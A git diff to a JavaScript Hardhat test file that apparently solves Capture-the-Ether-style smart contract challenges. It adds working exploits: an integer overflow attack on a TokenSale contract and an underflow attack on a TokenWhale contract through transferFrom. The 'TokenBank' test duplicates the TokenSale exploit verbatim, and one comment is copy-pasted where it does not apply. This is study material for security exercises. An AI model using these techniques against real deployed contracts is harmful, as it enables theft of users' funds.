@@ -139,17 +139,11 @@ describe("Tests", function () {
       });
 
       while (await ptf.isComplete()) {
-        console.log({
-          before: await ethers.provider.getBlockNumber("latest"),
-        });
         await attack.guess(guessN, { gasLimit: 50000 });
-        console.log({
-          after: await ethers.provider.getBlockNumber("latest"),
-        });
       }
 
-      expect(!(await ptf.isComplete())).to.equal(true);
-    }).timeout(500000);
+      expect(await ptf.isComplete()).to.not.equal(true);
+    });
   });
 
   describe("PredictsTheBlockHash", () => {
@@ -171,6 +165,83 @@ describe("Tests", function () {
       await ptbh.settle();
 
       expect(await ptbh.isComplete()).to.equal(true);
+    });
+  });
+
+  describe("TokenSale", () => {
+    it("Gets more tokens than it should", async () => {
+      /**
+       * (2^256 - 1) / 10^18 + 1
+       * =
+       * result = 115792089237316195423570985008687907853269984665640564039458
+       *
+       * uint256(result) * 10^18 = 415992086870360064
+       */
+      const maxIntAnd1 = BigNumber.from(
+        "115792089237316195423570985008687907853269984665640564039458"
+      );
+
+      const overflowed = BigNumber.from("415992086870360064");
+      const TS = await ethers.getContractFactory("TokenSaleChallenge");
+
+      const ts = await TS.deploy({ value: ethers.utils.parseEther("1") });
+
+      await ts.buy(maxIntAnd1, { value: overflowed, gasLimit: 50000 });
+
+      await ts.sell(1);
+
+      expect(await ts.isComplete()).to.equal(true);
+    });
+  });
+
+  describe("TokenWhale", () => {
+    it.only("Tricks the contract to underflow", async () => {
+      const [mainAcc, altAcc] = await ethers.getSigners();
+      /**
+       * (2^256 - 1) / 10^18 + 1
+       * =
+       * result = 115792089237316195423570985008687907853269984665640564039458
+       *
+       * uint256(result) * 10^18 = 415992086870360064
+       */
+
+      const TW = await ethers.getContractFactory("TokenWhaleChallenge");
+
+      const tw = await TW.deploy(mainAcc.address);
+
+      await tw.transfer(altAcc.address, 510);
+
+      await tw.connect(altAcc).approve(mainAcc.address, 1000);
+
+      await tw.transferFrom(altAcc.address, altAcc.address, 500);
+
+      expect(await tw.isComplete()).to.equal(true);
+    });
+  });
+
+  describe("TokenBank", () => {
+    it("Gets more tokens than it should", async () => {
+      /**
+       * (2^256 - 1) / 10^18 + 1
+       * =
+       * result = 115792089237316195423570985008687907853269984665640564039458
+       *
+       * uint256(result) * 10^18 = 415992086870360064
+       */
+      const maxIntAnd1 = BigNumber.from(
+        "115792089237316195423570985008687907853269984665640564039458"
+      );
+
+      const overflowed = BigNumber.from("415992086870360064");
+      const TS = await ethers.getContractFactory("TokenSaleChallenge");
+
+      const ts = await TS.deploy({ value: ethers.utils.parseEther("1") });
+
+      await ts.buy(maxIntAnd1, { value: overflowed, gasLimit: 50000 });
+
+      await ts.sell(1);
+
+      expect(await ts.isComplete()).to.equal(true);
     });
   });
 });
